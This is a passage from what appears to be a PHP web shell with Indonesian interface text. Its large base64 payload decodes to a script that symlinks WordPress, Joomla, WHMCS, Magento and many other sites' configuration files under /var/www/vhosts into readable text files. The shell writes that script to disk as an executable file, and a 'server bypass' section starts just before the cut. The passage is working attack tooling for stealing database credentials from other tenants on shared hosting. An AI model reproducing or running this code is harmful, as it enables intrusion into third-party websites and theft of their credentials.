ocCcsJHNpdGVzcy4nLW9zY29tbWVyY2UudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLW9zY29tbWVyY2VzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICI8YnI+PGJyPjxicj48Zm9udCBjb2xvcj1yZWQ+RG9uZSAhISA8aW1nIHNyYz0naHR0cDovL2kuaW1ndXIuY29tL0x0dWtFSk4ucG5nJyAgaGVpZ2h0PSc3MCcgd2lkdGg9JzYwJz48L2ZvbnQ+IjsNCg==';
$file = fopen("vhost.cin" ,"w+");
$write = fwrite ($file ,base64_decode($xaivhost));
fclose($file);
    chmod("vhost.cin",0755);
   echo "<a href='vhost'>Klik Ini</a>";
}
?>
</body>
</html>
<?php
//////////////////////////		
//                      //
// FITUR BYPASS SERVER  //
//                      //
//////////////////////////		
}elseif($_GET['do'] == 'bypass2') {?>
<?
